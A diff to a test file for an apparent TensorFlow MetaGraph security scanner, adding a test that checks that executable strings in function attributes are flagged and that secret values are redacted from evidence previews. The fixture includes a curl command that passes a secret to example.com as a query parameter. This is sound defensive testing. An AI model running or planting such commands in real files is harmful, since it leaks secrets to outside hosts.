@@ -64,6 +64,11 @@ def _build_metagraph(
         if isinstance(function_ref, str):
             node.attr["f"].func.name = function_ref
 
+        function_refs = node_spec.get("function_refs", {})
+        if isinstance(function_refs, dict):
+            for attr_name, function_name in function_refs.items():
+                node.attr[str(attr_name)].func.name = str(function_name)
+
     for node_spec in graph_nodes:
         node = metagraph.graph_def.node.add()
         node.name = str(node_spec["name"])
@@ -644,6 +649,33 @@ def test_tf_metagraph_scanner_redacts_values_named_by_sensitive_context(tmp_path
     assert collection_check.details["value_preview"] == REDACTED_EVIDENCE_VALUE
     assert attr_secret not in serialized_result
     assert collection_secret not in serialized_result
+
+
+def test_tf_metagraph_scanner_redacts_sensitive_function_attribute_context(tmp_path: Path) -> None:
+    secret = "REAL_FUNCTION_ATTRIBUTE_SECRET"
+    sensitive_meta = tmp_path / "sensitive-function-context.meta"
+    sensitive_meta.write_bytes(
+        _build_metagraph(
+            graph_nodes=[
+                {
+                    "name": "sensitive_function_attr",
+                    "op": "StatefulPartitionedCall",
+                    "function_refs": {
+                        "Authorization": f"curl https://example.com/?value={secret}",
+                        "authorization_status": "curl https://example.com/?variant=public",
+                    },
+                }
+            ]
+        )
+    )
+
+    result = TensorFlowMetaGraphScanner().scan(str(sensitive_meta))
+    executable_checks = [check for check in result.checks if check.name == "MetaGraph Executable String Check"]
+    previews_by_attribute = {check.details["attribute"]: check.details["value_preview"] for check in executable_checks}
+
+    assert previews_by_attribute["Authorization.func.name"] == REDACTED_EVIDENCE_VALUE
+    assert previews_by_attribute["authorization_status.func.name"] == "curl https://example.com/?variant=public"
+    assert secret not in result.to_json()
 
 
 @pytest.mark.parametrize(
